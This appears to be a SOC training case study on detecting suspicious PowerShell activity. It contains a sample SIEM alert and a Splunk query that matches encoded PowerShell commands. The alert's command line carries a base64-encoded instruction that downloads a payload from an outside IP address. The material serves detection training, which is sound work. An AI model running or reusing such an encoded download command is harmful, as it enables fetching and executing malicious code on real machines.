## Case 04: Suspicious PowerShell Detection

**Scenario:** EDR alerted on encoded PowerShell command downloading payload on `WKSTN-014`

### **SIEM Alert**

Timestamp: 2026-08-02 09:14:33
Host: WKSTN-014
EventID: 4104
Process: powershell.exe
CommandLine: powershell.exe -EncodedCommand SQB4AHcAIABoAHQAdABwADoALwAvADEAOAA1AC4AMgAzADQALgAyADEAOAAuADcANwAvAHAAYQB5AGwAbwBhAGQA
User: CONTOSO\j.smith


### **SPL Query Used**
See: `suspicious-powershell.spl`
```spl
index=windows EventCode=4104 CommandLine="*EncodedCommand*" 
| stats count by ComputerName, User, CommandLine
| where len(CommandLine) > 100

